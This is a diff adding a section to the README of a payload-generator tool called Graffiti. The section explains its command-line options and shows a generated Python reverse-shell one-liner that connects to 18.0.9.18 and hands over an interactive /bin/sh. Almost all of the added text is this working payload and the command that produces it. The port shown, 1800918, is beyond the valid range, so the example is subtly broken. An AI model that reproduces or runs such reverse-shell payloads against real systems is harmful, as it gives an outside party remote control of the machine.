@@ -59,3 +59,11 @@ Graffiti comes complete with a database that will insert each encoded payload in
 
 ![e1800918](pic/5.PNG)
 
+The `-p` command is the staff of life of Graffiti — use it to specify a payload, followed by `-c` to specify the encoding technique, and finally `-lH` and `-lP` to set the listening address and port, respectively. Here's a raw-format Python reverse shell which means no encoding:
+
+```bash
+
+root@e1800918:~/cyebr/Graffiti# graffiti -p /linux/python/socket_reverse.json -c raw -lH 18.0.9.18 -lP 1800918
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("18.0.9.18",1800918));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+```
